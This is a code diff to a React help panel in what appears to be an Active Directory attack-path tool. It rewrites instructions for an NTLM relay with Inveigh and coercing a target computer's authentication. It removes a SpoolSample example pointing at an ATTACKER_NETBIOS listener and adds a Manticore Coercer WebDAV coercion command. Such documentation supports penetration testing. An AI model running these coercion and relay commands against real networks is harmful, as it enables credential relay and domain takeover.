@@ -14,6 +14,7 @@
 //
 // SPDX-License-Identifier: Apache-2.0
 
+import { Link } from '@mui/material';
 import { Typography } from 'doodle-ui';
 import { FC } from 'react';
 import { EdgeInfoProps } from '../index';
@@ -21,20 +22,41 @@ import { EdgeInfoProps } from '../index';
 const WindowsAbuse: FC<EdgeInfoProps> = () => {
     return (
         <>
+            <Typography variant='body1'>1. Start the Relay Server</Typography>
             <Typography variant='body2'>
-                1: Start the Relay Server The NTLM relay can be executed with Inveigh.
+                The NTLM relay can be executed with{' '}
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/Kevin-Robertson/Inveigh'>
+                    Inveigh
+                </Link>
+                .
+            </Typography>
+            <Typography variant='body1'>2. Coerce the Target Computer</Typography>
+            <Typography variant='body2'>
+                Several coercion methods are documented here:{' '}
+                <Link
+                    target='_blank'
+                    rel='noopener noreferrer'
+                    href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
+                    Windows Coerced Authentication Methods
+                </Link>
+                .
             </Typography>
             <Typography variant='body2'>
-                2: Coerce the Target Computer Several coercion methods are documented here:{' '}
-                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
-                    Windows Coerced Authentication Methods
-                </a>
-                . Examples of tools include:
-                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
-                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
-                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
-                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP"
-                "ATTACKER_NETBIOS@PORT/file.txt"
+                Every coercion technique has prerequisites that must be met on the target. The following command uses{' '}
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/TheManticoreProject/coercer'>
+                    Manticore Coercer
+                </Link>{' '}
+                to attempt all relevant WebDAV coercion techniques. Success depends on the prerequisites for at least
+                one technique being met.
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'manticore-coercer coerce -t <target> -u <user> -p <pass> -d <domain> -l <listener-ip> --always-continue --path-type webdav'
+                }
+            </Typography>
+            <Typography variant='body2'>
+                The <code>--path-type webdav</code> option selects WebDAV paths for WebClient coercion. The required
+                connection-string format is <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>.
             </Typography>
         </>
     );
